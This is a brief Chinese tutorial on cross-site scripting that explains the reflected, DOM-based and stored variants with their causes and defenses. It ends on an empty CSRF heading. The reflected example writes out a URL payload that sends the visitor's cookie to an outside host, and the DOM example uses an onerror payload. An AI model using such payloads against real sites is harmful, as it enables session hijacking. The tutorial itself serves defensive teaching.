# Web 安全

# XSS ：跨站脚本攻击（Cross site Scripting）

> 由于英文缩写是css，和层叠样式表冲突，所以改为`XSS`

::: info

原理： 主要是通过`客户端网页`代码漏洞，注入`JavaScript`代码在客户端执行恶意脚本

:::

XSS根据攻击方式又分为三种：

1. Reflected XSS（基于反射的XSS攻击）
2. DOM-based or local XSS（基于DOM或本地的XSS攻击）
3. Stored XSS（基于存储的XSS攻击）

## 基于反射的XSS（Reflected XSS）

通过`用户输入`例如`URL参数`注入恶意`Script脚本`，例如：

`http://you.163.com/search?keyword=<script>document.location='http://xss.com/get?cookie='+document.cookie<script>`



`keyword`本身是一个搜索参数，正常情况搜索后接口会返回`keyword`和对应的`result，`页面会展示`keyword`和`result`



如果被改成一个恶意`script`脚本被用户点开，恰好页面渲染的搜索内容使用的是`innerHTML`，这时候用可以把用户的`cookie`发送到恶意的服务器

> 被攻击原因：此类型的攻击主要是前端网页校验不严格，没有预防可能注入的脚本
> 
> 预防：使用`innerText`渲染到页面可以大概率避免注入非法脚本

## 基于存储的XSS（Stored XSS）

攻击者通过`输入框`等可以保存信息到服务器的途径把恶意脚本保存到`服务器数据库`中，网站被访问后加载恶意脚本的形式实行恶意攻击。

> 被攻击原因： 前后端对用户输入没有校验，渲染时也没有校验
> 
> 预防：前后端严格校验用户输入的内容，对标签等内容进行转义



## 基于DOM或本地的XSS（ DOM-based or local XSS）

基于DOM和本地的XSS和反射的XSS区别就是反射型XSS会经过服务器的响应，而基于DOM和本地的XSS只在本地完成，比如：

```js
const userInput = "<img src=x onerror=alert('XSS')>";
const targetElement = document.getElementById("target");

// 这里是一个潜在的 DOM 型 XSS 漏洞
targetElement.innerHTML = userInput;
```

# XSS总结

- XSS不论是否经过服务器，最终都是在客户端执行恶意脚本

- 存储型XSS影响最大也最危险，可能会影响大规模用户，另外两种一般是用户自己触发

- XSS防御主要是包括输入验证、输出编码、[CSP](https://zhuanlan.zhihu.com/p/610361530?utm_id=0)等

# CSRF (跨站请求伪造)
